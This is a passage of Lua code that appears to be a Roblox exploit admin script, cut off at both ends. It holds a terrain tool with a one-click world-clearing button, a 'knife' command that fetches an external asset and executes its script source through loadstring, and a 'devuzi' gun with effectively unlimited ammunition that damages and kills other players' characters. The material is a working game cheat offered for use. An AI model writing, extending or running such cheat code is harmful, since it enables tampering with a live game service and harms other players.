ImageButton29.Position = UDim2.new(0.524545431, 0, 0.464040399, 0)
ImageButton29.BackgroundTransparency = 1
ImageButton29.ZIndex = 4
ImageButton29.Image = "http://www.roblox.com/asset/?id=67532051"
Frame30.Name = "Selection"
Frame30.Parent = ImageButton29
Frame30.Transparency = 1
Frame30.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame30.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame30.BackgroundColor3 = Color3.new(1, 1, 1)
Frame30.BackgroundTransparency = 1
Frame30.BorderSizePixel = 0
Frame30.ZIndex = 3
NumberValue31.Name = "num"
NumberValue31.Parent = ImageButton29
NumberValue31.Value = 10
ImageButton32.Name = "Gravel"
ImageButton32.Parent = ImageLabel1
ImageButton32.Transparency = 1
ImageButton32.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton32.Position = UDim2.new(0.0700000003, 0, 0.565050483, 0)
ImageButton32.BackgroundTransparency = 1
ImageButton32.ZIndex = 4
ImageButton32.Image = "http://www.roblox.com/asset/?id=67532206"
Frame33.Name = "Selection"
Frame33.Parent = ImageButton32
Frame33.Transparency = 1
Frame33.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame33.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame33.BackgroundColor3 = Color3.new(1, 1, 1)
Frame33.BackgroundTransparency = 1
Frame33.BorderSizePixel = 0
Frame33.ZIndex = 3
NumberValue34.Name = "num"
NumberValue34.Parent = ImageButton32
NumberValue34.Value = 11
ImageButton35.Name = "Cinder"
ImageButton35.Parent = ImageLabel1
ImageButton35.Transparency = 1
ImageButton35.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton35.Position = UDim2.new(0.524545431, 0, 0.565050483, 0)
ImageButton35.BackgroundTransparency = 1
ImageButton35.ZIndex = 4
ImageButton35.Image = "http://www.roblox.com/asset/?id=67532103"
Frame36.Name = "Selection"
Frame36.Parent = ImageButton35
Frame36.Transparency = 1
Frame36.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame36.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame36.BackgroundColor3 = Color3.new(1, 1, 1)
Frame36.BackgroundTransparency = 1
Frame36.BorderSizePixel = 0
Frame36.ZIndex = 3
NumberValue37.Name = "num"
NumberValue37.Parent = ImageButton35
NumberValue37.Value = 12
ImageButton38.Name = "Stone"
ImageButton38.Parent = ImageLabel1
ImageButton38.Transparency = 1
ImageButton38.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton38.Position = UDim2.new(0.0700000003, 0, 0.666060627, 0)
ImageButton38.BackgroundTransparency = 1
ImageButton38.ZIndex = 4
ImageButton38.Image = "http://www.roblox.com/asset/?id=67531804"
Frame39.Name = "Selection"
Frame39.Parent = ImageButton38
Frame39.Transparency = 1
Frame39.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame39.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame39.BackgroundColor3 = Color3.new(1, 1, 1)
Frame39.BackgroundTransparency = 1
Frame39.BorderSizePixel = 0
Frame39.ZIndex = 3
NumberValue40.Name = "num"
NumberValue40.Parent = ImageButton38
NumberValue40.Value = 13
ImageButton41.Name = "Cement"
ImageButton41.Parent = ImageLabel1
ImageButton41.Transparency = 1
ImageButton41.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton41.Position = UDim2.new(0.524545431, 0, 0.666060627, 0)
ImageButton41.BackgroundTransparency = 1
ImageButton41.ZIndex = 4
ImageButton41.Image = "http://www.roblox.com/asset/?id=67532059"
Frame42.Name = "Selection"
Frame42.Parent = ImageButton41
Frame42.Transparency = 1
Frame42.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame42.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame42.BackgroundColor3 = Color3.new(1, 1, 1)
Frame42.BackgroundTransparency = 1
Frame42.BorderSizePixel = 0
Frame42.ZIndex = 3
NumberValue43.Name = "num"
NumberValue43.Parent = ImageButton41
NumberValue43.Value = 14
ImageButton44.Name = "Red Plastic"
ImageButton44.Parent = ImageLabel1
ImageButton44.Transparency = 1
ImageButton44.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton44.Position = UDim2.new(0.0700000003, 0, 0.767070711, 0)
ImageButton44.BackgroundTransparency = 1
ImageButton44.ZIndex = 4
ImageButton44.Image = "http://www.roblox.com/asset/?id=67531848"
Frame45.Name = "Selection"
Frame45.Parent = ImageButton44
Frame45.Transparency = 1
Frame45.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame45.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame45.BackgroundColor3 = Color3.new(1, 1, 1)
Frame45.BackgroundTransparency = 1
Frame45.BorderSizePixel = 0
Frame45.ZIndex = 3
NumberValue46.Name = "num"
NumberValue46.Parent = ImageButton44
NumberValue46.Value = 15
ImageButton47.Name = "Blue Plastic"
ImageButton47.Parent = ImageLabel1
ImageButton47.Transparency = 1
ImageButton47.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton47.Position = UDim2.new(0.524545431, 0, 0.767070711, 0)
ImageButton47.BackgroundTransparency = 1
ImageButton47.ZIndex = 4
ImageButton47.Image = "http://www.roblox.com/asset/?id=67531924"
Frame48.Name = "Selection"
Frame48.Parent = ImageButton47
Frame48.Transparency = 1
Frame48.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame48.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame48.BackgroundColor3 = Color3.new(1, 1, 1)
Frame48.BackgroundTransparency = 1
Frame48.BorderSizePixel = 0
Frame48.ZIndex = 3
NumberValue49.Name = "num"
NumberValue49.Parent = ImageButton47
NumberValue49.Value = 16
ImageButton50.Name = "Water"
ImageButton50.Parent = ImageLabel1
ImageButton50.Transparency = 1
ImageButton50.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton50.Position = UDim2.new(0.0700000003, 0, 0.867999971, 0)
ImageButton50.BackgroundTransparency = 1
ImageButton50.ZIndex = 4
ImageButton50.Image = "https://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=75&ht=75&aid=82717697"
Frame51.Name = "Selection"
Frame51.Parent = ImageButton50
Frame51.Transparency = 1
Frame51.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame51.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame51.BackgroundColor3 = Color3.new(1, 1, 1)
Frame51.BackgroundTransparency = 1
Frame51.BorderSizePixel = 0
Frame51.ZIndex = 3
NumberValue52.Name = "num"
NumberValue52.Parent = ImageButton50
NumberValue52.Value = 17
ImageButton53.Name = "Dig"
ImageButton53.Parent = ImageLabel1
ImageButton53.Transparency = 1
ImageButton53.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton53.Position = UDim2.new(0.524999976, 0, 0.867999971, 0)
ImageButton53.BackgroundTransparency = 1
ImageButton53.ZIndex = 4
ImageButton53.Image = "http://www.roblox.com/asset/?id=7814201"
Frame54.Name = "Selection"
Frame54.Parent = ImageButton53
Frame54.Transparency = 1
Frame54.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame54.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame54.BackgroundColor3 = Color3.new(1, 1, 1)
Frame54.BackgroundTransparency = 1
Frame54.BorderSizePixel = 0
Frame54.ZIndex = 3
for i,v in pairs(mas:GetChildren()) do
	v.Parent = gPlayers.LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
wait(0.01)
gPlayers.LocalPlayer.PlayerGui.MaterialGui.MaterialMenu.Visible = false
material = 1
local Terrain = workspace.Terrain
local CC = workspace.CurrentCamera

local SelB = Instance.new("SelectionBox")
SelB.Color = BrickColor.new("Bright green")

local SelP = Instance.new("Part")
SelP.Anchored = true
SelP.formFactor = Enum.FormFactor.Custom

HopperBin0.Selected:connect(function(M)
	SelB.Parent = gPlayers.LocalPlayer.PlayerGui
	gPlayers.LocalPlayer.PlayerGui.MaterialGui.MaterialMenu.Visible = true
	SelB.Adornee = nil

	local ClickState = "None"

	local ClickType = 1

	local TerrainClick = 1

	local P1 = nil

	M.KeyDown:connect(function(K)
		if K == "q" then
			ClickType = 1
		elseif K == "e" then
			ClickType = 2
		elseif K == "z" then
			TerrainClick = 0
		elseif K == "x" then
			TerrainClick = 1
		elseif K == "c" then
			TerrainClick = 2
		elseif K == "v" then
			TerrainClick = 3
		elseif K == "b" then
			TerrainClick = 4
		end
	end)

	M.Button1Down:connect(function()
		if not M.Target then return end
		local Hit = M.Hit
		local cellPos
		if ClickType == 1 then
			cellPos = Terrain:WorldToCellPreferEmpty(Vector3.new(Hit.x, Hit.y, Hit.z))
		else
			cellPos = Terrain:WorldToCellPreferSolid(Vector3.new(Hit.x, Hit.y, Hit.z))
		end
		if ClickState == "None" then
			ClickState = "Click1"
			P1 = cellPos
		end
	end)
	M.Button1Up:connect(function()
		if not M.Target then return end
		local Hit = M.Hit
		local cellPos
		if ClickType == 1 then
			cellPos = Terrain:WorldToCellPreferEmpty(Vector3.new(Hit.x, Hit.y, Hit.z))
		else
			cellPos = Terrain:WorldToCellPreferSolid(Vector3.new(Hit.x, Hit.y, Hit.z))
		end
		if ClickState == "Click1" then
			ClickState = "None"
			local MinX = math.min(P1.x,cellPos.x)
			local MaxX = math.max(P1.x,cellPos.x)
			local MinY = math.min(P1.y,cellPos.y)
			local MaxY = math.max(P1.y,cellPos.y)
			local MinZ = math.min(P1.z,cellPos.z)
			local MaxZ = math.max(P1.z,cellPos.z)
			for y=MinY,MaxY do
				for x=MinX,MaxX do
					for z=MinZ,MaxZ do
						Terrain:SetCell(x, y, z, material, 0, 0)
					end
				end
				wait()
			end
			SelB.Adornee = nil
		end
	end)
	M.Move:connect(function()
		if not M.Target then return end
		local Hit = M.Hit
		local cellPos
		if ClickType == 1 then
			cellPos = Terrain:WorldToCellPreferEmpty(Vector3.new(Hit.x, Hit.y, Hit.z))
		else
			cellPos = Terrain:WorldToCellPreferSolid(Vector3.new(Hit.x, Hit.y, Hit.z))
		end
		if ClickState == "Click1" then
			SelB.Adornee = SelP
			local W1 = Terrain:CellCenterToWorld(P1.x,P1.y,P1.z)
			local W2 = Terrain:CellCenterToWorld(cellPos.x,cellPos.y,cellPos.z)
			local Size = W1-W2
			Size = Vector3.new(math.abs(Size.x),math.abs(Size.y),math.abs(Size.z))+Vector3.new(4,4,4)
			local Pos = (W1+W2)/2
			SelP.Size = Size
			SelP.CFrame = CFrame.new(Pos)
		end
	end)
end)

HopperBin0.Deselected:connect(function()
	SelB.Parent = nil
	SelB.Adornee = nil
	gPlayers.LocalPlayer.PlayerGui.MaterialGui.MaterialMenu.Visible = false
end)

game:GetService('RunService').Stepped:connect(function()
if gPlayers.LocalPlayer.PlayerGui:FindFirstChild("MaterialGui") then
for _, child in pairs( gPlayers.LocalPlayer.PlayerGui.MaterialGui.MaterialMenu:GetChildren()) do
	if child:FindFirstChild("num") and material ~= child.num.Value then
	child.Selection.BackgroundTransparency = 1
	end
    end
end
end)

for _, child in pairs( gPlayers.LocalPlayer.PlayerGui.MaterialGui.MaterialMenu:GetChildren()) do
	local enterCon = child.MouseButton1Click:connect(function()
    if child.ClassName == "ImageButton" and child:FindFirstChild("num") then
	material = child.num.Value
	if child:FindFirstChild("Selection") then
	child.Selection.BackgroundTransparency = 0
	end
    end
	end)
end

local clr = gPlayers.LocalPlayer.PlayerGui.MaterialGui.MaterialMenu.Dig.MouseButton1Click:connect(function()
workspace.Terrain:Clear()
end)

function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
HopperBin0 = Instance.new("HopperBin")
HopperBin0.Name = "Terrain Delete"
HopperBin0.Parent = mas
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.Backpack
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end

function onClick(mouse)
		p = gPlayers.LocalPlayer
		if (p == nil) then return end
		if (p.Character == nil) then return end
		
		if (mouse.Hit.p - p.Character.HumanoidRootPart.Position).magnitude > 500 then return end

		c = workspace.Terrain
		
		local cellPos = c:WorldToCellPreferSolid(Vector3.new(mouse.Hit.x, mouse.Hit.y, mouse.Hit.z))
		local x = cellPos.x
		local y = cellPos.y
		local z = cellPos.z		

		c:SetCell(x, y, z, 0, 0, 0)
		
end


function onSelect(mouse)
		mouse.Button1Down:connect(function () onClick(mouse) end)
end



HopperBin0.Selected:connect(onSelect)
end
end)

addcmd('knife', 'tm knife',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
if not game.CoreGui:FindFirstChild('CorePart') then
local data = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://01318477872")
local script = data.LocalScript

local player = gPlayers.LocalPlayer

if not player:FindFirstChild("TMDATA") then
	script.Parent.TMDATA:Clone().Parent = player
end
if not game.ReplicatedStorage:FindFirstChild("GameInProgress") then
	script.Parent.GameInProgress:Clone().Parent = game.ReplicatedStorage
end

if game.CoreGui:FindFirstChild("CorePart") then
	game.CoreGui.CorePart:Destroy()
end


if not game.ReplicatedStorage:FindFirstChild('Drone') then script.Parent.Drone:Clone().Parent = game.ReplicatedStorage end
local knife = script.Parent["Knife"]:Clone()
local gun = script.Parent["Gun"]:Clone()
local fastgun = script.Parent["Fast Gun"]:Clone()
local lasergun = script.Parent["Laser Gun"]:Clone()
script.Parent.CorePart:Clone().Parent = game.CoreGui

local newKnife = knife:Clone()
newKnife.Parent = player.Backpack
_G.tool = newKnife

local barActive = false
local activeOptions = {}

function createDDown(callback,but,...)
	if barActive then
		for i,v in pairs(activeOptions) do
			v:Destroy()
		end
		activeOptions = {}
		barActive = false
		return
	else
		barActive = true
	end
	local slots = {...}
	local base = but
	for i,v in pairs(slots) do
		local newOption = base:Clone()
		newOption.ZIndex = 5
		newOption.Name = "Option "..tostring(i)
		newOption.Parent = base.Parent
		table.insert(activeOptions,newOption)
		newOption.Position = UDim2.new(but.Position.X.Scale, but.Position.X.Offset, but.Position.Y.Scale, but.Position.Y.Offset + (#activeOptions * but.Size.Y.Offset))
		newOption.Text = slots[i]
		newOption.MouseButton1Down:connect(function()
			but.Text = slots[i]
			callback(slots[i])
			for i,v in pairs(activeOptions) do
				v:Destroy()
			end
			activeOptions = {}
			barActive = false
		end)
	end
end

local butA = game.CoreGui.CorePart.Frame.ability
butA.MouseButton1Down:connect(function()
	createDDown(function(sel)
		gPlayers.LocalPlayer.TMDATA.Ability.Value = sel -- Rushed scripting, sorry for not being neat!
	end,butA,"Normal","Laser Knife","Boom Blade","MLG Money","Midas Touch","HOT! Knife","Ghost Knife","Tesla Knife","Quickscoper","Rainbow Laser","Spider Knife","Warp Knife","Brainwasher", "Bolting Knife")
end)

local butG = game.CoreGui.CorePart.Frame.gamemode
butG.MouseButton1Down:connect(function()
	createDDown(function(sel)
		game.ReplicatedStorage.GameInProgress.Mode.Value = sel
	end,butG,"Classic","Cold Killer")
end)

local butM = game.CoreGui.CorePart.Frame.mode
butM.MouseButton1Down:connect(function()
	createDDown(function(sel)
		_G.knifemode = sel
	end,butM,"PlayersOnly","Players+Npcs")
end)

_G.Scripters = {}

function _G.loadScripts(obj,runall)
	for i,v in pairs(obj:GetDescendants()) do
		if v:IsA("LocalScript") and (not v.Disabled or runall) then
			table.insert(_G.Scripters,v)
			local i = #_G.Scripters
			local loadfunc = loadstring("local script = _G.Scripters["..i.."]\n"..v.Source)
			spawn(loadfunc)
			print("LOADED",v:GetFullName())
		end
	end
end

player.CharacterAdded:Connect(function()
	newKnife = knife:Clone()
	newKnife.Parent = player.Backpack
	_G.loadScripts(newKnife)
end)

_G.knifemode = "PlayersOnly"
	_G.loadScripts(newKnife)
	--_G.loadScripts(gun)
	--_G.loadScripts(fastgun)
	--_G.loadScripts(lasergun)
end
end
end)

addcmd('devuzi', 'op af',{'uzi'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
wait(0.25);
 
 
_clear=function()
        local c={char;bag;gui;};
        for i=1,#c do
                local c=c[i]:children();
                for i=1,#c do
                        if(c[i].Name==name)then
                                c[i].Parent=nil;
                        end;
                end;
        end;
        local n=name..user.Name;
        local c=workspace:children();
        for i=1,#c do
                if(c[i].Name==n)then
                        c[i].Parent=nil;
                end;
        end;
end;
 
_valid_key=function(object,key)
        return object[key],key;
end;
 
_new=function(class)
        return function(props)
                if(type(list_base_props)=='table')then
                        for i,v in next,list_base_props do
                                if(props[i]==nil)then
                                        props[i]=v;
                                end;
                        end;
                end;
               
                local object=class;
               
                if(type(class)=='string')then
                        object=Instance.new(class:sub(1,1):upper()..class:sub(2));
                end;
               
                local parent=props[1];
                        props[1]=nil;
               
                for i,v in next,props do
                        local load,res,key=pcall(_valid_key,object,i:sub(1,1):upper()..i:sub(2));
                        if(not load)then
                                load,res,key=pcall(_valid_key,object,i);
                        end;
                       
                        if(key)then
                                t=type(res);
                                s=tostring(res);
                                if(t=='userdata'and s=='Signal '..key)then
                                        if(type(v)=='table')then
                                                for i=1,#v do
                                                        res:connect(v[i]);
                                                end;
                                        else
                                                res:connect(v);
                                        end;
                                else
                                        object[key]=v;
                                end;
                        end;
                end;
               
                if(parent)then
                        object.Parent=parent;
                end;
               
                return object;
        end;
end;
 
_RGB=function(r,g,b)
        return Color3.new(r/255,g/255,b/255);
end;
 
_copy=function(o)
        local def=o.archivable;
        o.archivable=true;
        local c=o:clone();
        o.archivable=def;
        return c;
end;
 
_hum=function(char)
        local hum=char:findFirstChild'Humanoid';
        if(not hum or hum.className~='Humanoid')then
                local c=char:children();
                for i=1,#c do
                        if(c[i].className=='Humanoid')then
                                return c[i];
                        end;
                end;
        else
                return hum;
        end;
end;
 
_hum_tag=function(hum)
        local c=hum:findFirstChild'creator'or Instance.new('ObjectValue',hum);
                c.Name='creator';
                c.Value=user;
        if(hum.Health==0 and not hum:findFirstChild'killed')then
                Instance.new('BoolValue',hum).Name='killed';
                bullets.clip=bullets.clip+10;
        end;
end;
 
_hum_dam=function(hum,dam,percent)
        hum.Health=hum.Health-(percent and hum.MaxHealth*(dam*0.01)or dam);
        if(hum.Health<=hum.MaxHealth*0.1)then
                _hum_tag(hum);
        end;
end;
 
_ray=function(v0,v1,i)
        local mag=(v0-v1).magnitude;
        local ray=Ray.new(v0,(v1-v0).unit*(mag>999 and 999 or mag));
       
        return(type(i)=='table'and workspace.FindPartOnRayWithIgnoreList or workspace.FindPartOnRay)(workspace,ray,i);
end;
 
_must=function(v0,v1,i)
        local hit,pos=_ray(v0,v1,i);
        return not hit and mouse.target or hit,pos;
end;
 
_cframe=function(x,y,z,r0,r1,r2)
        return CFrame.Angles(
                math.rad(r0 or 0),
                math.rad(r1 or 0),
                math.rad(r2 or 0)
        )*CFrame.new(x,y,z);
end;
 
_update=function()
        if(bool_active and not screen.Parent)then
                screen.Parent=gui;
        elseif(not bool_active and screen.Parent)then
                screen.Parent=nil;
        end;
end;
 
_light=function(v0,v1)
        local mag=(v0-v1).magnitude;
        local len=math.random(2,7);
                len=len>mag/2 and mag/2 or len;
       
        --local light=_new'part'{
        --        cFrame=CFrame.new(v0,v1);
        --        size=Vector3.new(1,1,1);
        --        color=_RGB(255,255,0);
        --        anchored=true;
        --        inv;
        --};
                _new'blockMesh'{
                        scale=Vector3.new(0.2,0.2,len);
                        offset=Vector3.new(0,0,-len/2);
                        light;
                };
               
        local bb=_new'billboardGui'{
                size=UDim2.new(2,0,2,0);
                adornee=light;
                light;
        };
                _new'imageLabel'{
                        image=url:format(109101526);
                        backgroundTransparency=1;
                        size=UDim2.new(1,0,1,0);
                        bb;
                };
               
       -- _rem(light,0.15);
end;
 
_rem=function(object,del)
        if(del)then
                delay(del,function()
                        if(object.Parent)then
                                object.Parent=nil;
                        end;
                end);
        else
                pcall(function()
                        if(object.Parent)then
                                object.Parent=nil;
                        end;
                end);
        end;
end;
 
_blood=function(pos,count)
        for i=1,count do
                local p=_new'part'{
                        rotVelocity=Vector3.new(math.random(),math.random(),math.random())*50;
                        position=pos+Vector3.new(math.random(),math.random(),math.random());
                        velocity=Vector3.new(math.random(),math.random(),math.random())*50;
                        size=Vector3.new(math.random(),math.random(),math.random())/3;
                        color=_RGB(255,0,0);
                        transparency=0.5;
                        canCollide=true;
                        bottomSurface=0;
                        topSurface=0;
                        formFactor=3;
                        locked=true;
                        inv;
                };
                delay(5,function()
                        p.Parent=nil;
                end);
        end;
end;
 
_make_hue=function()
        h_hue=_new'part'{
                size=Vector3.new(0.25,1.8,0.35);
                color=_RGB(100,100,100);
                formFactor=3;
                name='hue';
                handle;
        };
        hh_weld=_new'weld'{
                c1=_cframe(0,0.5,0);
                part0=handle;
                part1=h_hue;
                handle;
        };
end;
 
_shot=function(v0,v1)
        if(not time_left)then
                time_left=0;
        end;
        if(time_left>time())then
                return nil;
        else
                time_left=time()+math.random(1,10)/100;
        end;
       
        if(bullets.current<1)then
                local tick_sound=head:findFirstChild'tick_sound'or _new'sound'{
                        soundId='rbxasset://sounds/SWITCH3.wav';
                        name='tick_sound';
                        volume=0.2;
                        pitch=2;
                        head;
                };
                tick_sound:play();
                if(bullets.clip>0)then
                        time_left=time()+2;
                        h_hue:breakJoints();
                        h_hue.CanCollide=true;
                        h_hue.Velocity=(h_hue.CFrame*CFrame.new(0,5,0)).lookVector*10;
                        _rem(h_hue,10);
                        delay(1.9,function()
                                _make_hue();
                                local got=(bullets.clip>bullets.maximum and
                                        bullets.maximum or
                                        bullets.clip)-bullets.current;
 
                                bullets.clip=bullets.clip-got;
                                bullets.current=bullets.current+got;
                        end);
                end;
                return nil;
        else
                bullets.current=bullets.current-1;
               
                h_weld.C1=_cframe(0,0.75,0,
                                        -math.random(1000,1100)/10,180,0);
                d_weld.C1=_cframe(0,-0.25,0.3);
               
                lightstuff.Visible=true;
                delay(0.1,function()
                        lightstuff.Visible=false;
                end);
               
                _rem(_new'part'{
                        velocity=CFrame.new(drag.Position,(drag.CFrame*CFrame.new(-4,-5,0)).p).lookVector*10;
                        cFrame=drag.CFrame*CFrame.new(-0.5,0,0);
                        size=Vector3.new(0.1,0.1,0.4);
                        color=_RGB(200,200,0);
                        material='Slate';
                        canCollide=true;
                        formFactor=3;
                        inv;
                },5);
 
                delay(0.1,function()
                        d_weld.C1=_cframe(0,-0.25,0);
                        if(bool_active)then
                                h_weld.C1=h_weld_cf_active;
                        end;
                end)
        end;
       
        local hit,pos=_must(v0,v1,char);
       
        shot_sound:play();
       
 
                                _rem(_new'part'{
                                        cFrame=CFrame.new(v0,pos)*CFrame.new(0,0,-(v0-pos).magnitude*0.5);
                                        size=Vector3.new(0.1,0.1,(v0-pos).magnitude);
                                        color=_RGB(255,255,0);
                                        transparency=0.6;
                                                                                reflectance=0.5;
                                        canCollide=false;
                                        bottomSurface=0;
                                        anchored=true;
                                        formFactor=3;
                                        topSurface=0;
                                        inv;
                                },.15);
        _light(v0,v1);
       
        if(not hit)then return nil;end;
       
        if(hit.Parent.className=='Hat')then
                hit:breakJoints();
                hit.CanCollide=true;
                hit.Velocity=CFrame.new(v0,pos).lookVector*math.random(30,50);
                hit.RotVelocity=Vector3.new(math.random(1,90),math.random(1,90),math.random(1,90));
        else
                local hum=_hum(hit.Parent);
                if(not hum)then
                        if(hit.Anchored==false and hit.Size.magnitude<4)then
                                hit:breakJoints();
                                hit.CanCollide=true;
                        end;
                else
                        _hum_dam(hum,math.random(4,6));
                        _blood(pos,math.random(3,6));
                        hit.RotVelocity=Vector3.new(math.random(1,90),math.random(1,90),math.random(1,90))/6;
                        if(hit.Name=='Head')then
                                hum.Health=0;
                                _blood(pos,math.random(3,6));
                                delay(0.001,function()
                                        _new(workspace:FindFirstChild'head_shot'or'sound'){
                                                pitch=math.random(70,100)*0.01;
                                                soundId=url:format(1876552);
                                                name='head_shot';
                                                workspace;
                                        }:play();
                                end);
                                _hum_tag(hum);
                                _rem(_new'part'{
                                        cFrame=CFrame.new(v0,pos)*CFrame.new(0,0,-(v0-pos).magnitude*0.5);
                                        size=Vector3.new(0.1,0.1,(v0-pos).magnitude);
                                        color=torso.Color;
                                        transparency=0.5;
                                        canCollide=false;
                                        bottomSurface=0;
                                        anchored=true;
                                        formFactor=3;
                                        topSurface=0;
                                        inv;
                                },30);
                                hit.Parent=nil;
                                for b=0,1 do
                                        for a=0,1 do
                                                for i=0,1 do
                                                        _rem(_new'part'{
                                                                velocity=CFrame.new(v0,pos).lookVector*20;
                                                                cFrame=hit.CFrame*CFrame.new(i,-b,a);
                                                                size=Vector3.new(0.5,0.5,0.5);
                                                                color=_RGB(255,255,255);
                                                                bottomSurface=0;
                                                                canCollide=true;
                                                                transparency=0;
                                                                formFactor=3;
                                                                topSurface=0;
                                                                hum;
                                                        },30);
                                                end;
                                        end;
                                end;
                        end;
                end;
        end;
end;
 
 
 
_cf_select=function(mouse)
        mouse.Icon=url:format(109111387);--108999296
        bool_active=true;
       
        local arm=char:findFirstChild'Right Arm';
        local weld=torso:findFirstChild'Right Shoulder';
        if(arm and weld)then
                h_weld.Part0=arm;
                h_weld.C1=h_weld_cf_active;
               
                weld.Part1=nil;
                weld.Part0=nil;
               
                weld=_new(torso:findFirstChild'right_arml'or'weld'){
                        name='right_arml';
                        part0=torso;
                        part1=arm;
                        torso;
                };
               
                arml=(arml or 0)+1;
                local alv=arml;
                local gyro=torso:findFirstChild'p_gyro'or Instance.new('BodyGyro',torso);
                        gyro.maxTorque=Vector3.new(5e5,5e5,5e5);
                        gyro.P=30000;
                        gyro.D=1000;
                        gyro.Name='p_gyro';
                repeat
                        local pos=mouse.hit.p;
                        local val,valp,p0,p1,p2,hitpos,cj,c0,c1;
                       
                        val=-math.pi*0.5;
                        valp=val*-1;
                        p0=torso.CFrame;
                        p0=p0+((p0*CFrame.Angles(valp,0,0)).lookVector*0.5)+(p0*CFrame.Angles(0,val,0)).lookVector;
                        p1=p0+((p0.p-pos).unit*-2);
                        p2=CFrame.new((p0.p+p1.p)/2,p0.p)*CFrame.Angles(val,val,0);
                        hitpos=torso.Position;
                        cj=CFrame.new(hitpos);
                        c0=torso.CFrame:inverse()*cj;
                        c1=p2:inverse()*cj;
                        weld.C0=c0;
                        weld.C1=c1;
                       
                        gyro.cframe=CFrame.new(torso.Position,Vector3.new(pos.X,torso.Position.Y,pos.Z));
                       
                        wait(0.001);
                until arml~=alv;
                gyro.Parent=nil;
        end;
end;
 
_cf_deselect=function()
        bool_active=false;
        arml=(arml or 0)+1;
        loop_shot=(loop_shot or 0)+1;
               
        h_weld.Part0=torso;
        h_weld.C1=h_weld_cf_inactive;
       
        local weld=torso:findFirstChild'right_arml';
        if(weld)then
                weld.Part1=nil;
                weld.Part0=nil;
        end;
        local arm=char:findFirstChild'Right Arm';
        local weld=torso:findFirstChild'Right Shoulder';
        if(arm and weld)then
                weld.Part0=torso;
                weld.Part1=arm;
        end;
end;
 
_cf_mouse=function(event,fun)
        mouse[event:sub(1,1):upper()..event:sub(2)]:connect(function(...)
                if(bool_active)then
                        fun(...);
                end;
        end);
end;
 
 
do
        local main=getfenv(0);
        local c=game:children();
        local check=function(v)
                if(v.className~=''and v.className~='Instance'and game:service(v.className))then
                        main[v.className:sub(1,1):lower()..v.className:sub(2)]=v;
                end;
        end;
        for i=1,#c do
                pcall(check,c[i]);
        end;
end;
 
 
bullets={
        maximum=51111111111111111111111111110;
        current=511111111111111111111111111111110;
        clip=501111111111111111111111111111111*4;
};
 
list_base_props={
        backgroundColor3=_RGB(0,0,0);
        textColor3=_RGB(200,200,200);
        borderSizePixel=0;
        color=_RGB(0,0,0);
        archivable=false;
        canCollide=false;
        bottomSurface=0;
        topSurface=0;
        formFactor=0;
        locked=true;
};
 
 
 
user=players.localPlayer;
mouse=user:getMouse();
char=user.Character;
gui=user.PlayerGui;
bag=user.Backpack;
torso=char.Torso;
head=char.Head;
hum=_hum(char);
 
url='rbxassetid://%d';
name='dev-uzi';
 
h_weld_cf_inactive=_cframe(0.35,0.5,0.5,
                                                        0,90,-70);
h_weld_cf_active=_cframe(0,0.75,0,
                                                -110,180,0);
 
assert(hum,'humanoid is not found');
 
 
 
_clear();
 
 
_cf_mouse('button1Down',function()
        loop_shot=(loop_shot or 0)+1;
        local vers=loop_shot;
        local step=runService.Stepped;
        repeat
                _shot((tube.CFrame*CFrame.new(0,0,tube.Size.Z*0.5)).p,mouse.hit.p);
                step:wait();--wait(0.001);
        until vers~=loop_shot;
end);
 
_cf_mouse('button1Up',function()
        loop_shot=(loop_shot or 0)+1;
end);
 
_cf_mouse('move',function()
        cross_f.Position=UDim2.new(0,mouse.X-11,0,mouse.Y-11);
end);
 
_cf_mouse('keyDown',function(k)
        if(k=='r')then
                if(bullets.clip>0 and time_left<=time())then
                        local got=(bullets.clip>bullets.maximum and
                                bullets.maximum or
                                bullets.clip)-bullets.current;
 
                        bullets.clip=bullets.clip-got;
                        bullets.current=bullets.current+got;
                        if(got~=0)then
                                time_left=time()+2;
                        end;
                end;
        end;
end);
 
 
screen=_new'screenGui'{
        name=name;
};
 
cross_f=_new'frame'{
        size=UDim2.new(0,21,0,21);
        backgroundTransparency=1;
        screen;
};
 
for i=0,1 do
        _new'frame'{
                position=UDim2.new(0,13*i,0,11);
